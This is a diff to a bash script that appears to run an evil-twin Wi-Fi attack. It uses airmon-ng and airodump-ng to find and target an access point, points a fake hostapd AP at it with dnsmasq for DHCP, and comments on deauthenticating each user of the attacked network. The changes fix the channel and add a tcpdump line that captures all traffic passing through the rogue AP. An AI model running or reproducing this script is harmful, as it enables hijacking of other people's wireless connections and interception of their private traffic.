@@ -13,7 +13,8 @@ sudo systemctl restart NetworkManager
 
 sudo airmon-ng start $interface
 
-sudo timeout -s 2 25 airodump-ng $monitor_interface -w scan & sleep 26
+sudo timeout -s 2 25 airodump-ng -c 11 $monitor_interface -w scan & sleep 26
+
 
 sudo rm scan-01.cap & sudo rm scan-01.csv & sudo rm scan-01.kismet.netxml
 
@@ -50,7 +51,7 @@ echo "$finalMAC"
 
 sudo airmon-ng start $interface
 
-sudo timeout -s 2 80 airodump-ng $monitor_interface --bssid $finalMAC -a -w device & sleep 81
+sudo timeout -s 2 40 airodump-ng -c 11 $monitor_interface --bssid $finalMAC -a -w device & sleep 41
 
 #Delete line 1 to 5 (useless lines, without data wanted)
 sed -i '1,5d' device-01.csv
@@ -58,7 +59,8 @@ sed -i '1,5d' device-01.csv
 sed -i '$d' device-01.csv
 
 #Automatically change the channel of the fake AP to match with the original
-sed -i "7s/.*/channel="$finalChannel"/" hostconf.conf
+#sed -i "7s/.*/channel="$finalChannel"/" hostconf.conf
+
 
 #Death each user of the AP attacked
 
@@ -101,5 +103,7 @@ sudo rm scan-01.log.csv
 
 #Exec dnsmasq on another terminal to setup dhcp
 sudo gnome-terminal -- bash -c "sudo dnsmasq -d -C host.conf ; exec bash"
+
+sudo tcpdump -i $interface -s 65535 -w traffic.pcap
 
 sudo rm device-01.cap & sudo rm device-01.csv & sudo rm device-01.kismet.netxml & sudo rm device-01.kismet.csv & sudo rm device-01.log.csv
